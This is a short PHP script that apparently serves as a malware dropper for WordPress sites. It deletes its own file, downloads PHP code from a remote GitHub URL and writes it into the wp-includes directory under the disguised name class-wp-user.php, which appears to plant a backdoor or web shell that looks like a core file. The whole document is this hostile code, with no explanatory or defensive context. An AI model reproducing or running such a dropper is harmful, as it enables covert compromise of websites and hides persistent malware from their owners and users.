<?php
        unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
        $c = file_get_contents('https://raw.githubusercontent.com/maddalenasa/supportaa/refs/heads/main/v2/vBQh7I7CwoTyox.php');
        if (strpos($c, '<?php')===false)  die('err fgc');
        $r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-includes/blocks/search/class-wp-user.php', $c);
        if ($r===false) die('err saving');
        die('/wp-includes/blocks/search/class-wp-user.php');